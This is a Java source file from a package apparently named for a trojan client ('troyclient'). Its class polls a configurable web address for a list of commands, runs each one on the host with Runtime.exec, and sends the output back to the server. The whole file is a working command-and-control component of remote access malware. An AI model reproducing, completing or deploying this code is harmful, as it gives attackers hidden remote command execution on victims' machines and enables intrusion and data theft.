package ch.lebois.troyclient;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class CommandReciver {


    private String url = "http://localhost:8080/command";
    private WebHandler webHandler;
    private Sender sender;

    CommandReciver() {
        setUrl(url);
    }

    CommandReciver(String url) {
        setUrl(url);
    }


    public void setUrl(String url) {
        this.url = url;
        webHandler = new WebHandler(url);
        sender = new Sender();
    }

    public void readCommands() {
        try {
            String left = webHandler.getContent().split("id=\"commands\">")[1].split("</pre>")[0];

            String[] commands = left.replace("\\r", "").split("\\n");
            for (String command : commands) {
                try {
                    for (String out : execute(command)) {
                        new Sender().send("commandout", out);
                    }
                } catch (NullPointerException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException e) {
            //TODO log no Commands
        }
    }


    public ArrayList<String> execute(String command) {
        System.out.println("-" + command);

        ArrayList<String> output = new ArrayList<>();
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = command.split(" ");
            Process proc = rt.exec(commands);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            output.add(ConsoleColor.BLUE.getColor() + System.getProperty("user.dir") + " $ "
                       + ConsoleColor.CYAN_BRIGHT.getColor() + command);

            String s;
            while ((s = stdInput.readLine()) != null) {
                output.add(ConsoleColor.GREEN.getColor() + s);
            }

            while ((s = stdError.readLine()) != null) {
                output.add(ConsoleColor.RED.getColor() + s);
            }
        } catch (IOException ignored) {
            output.add(ConsoleColor.RED.getColor() + command + " failed");
            return output;
        }
        return output;
    }
}
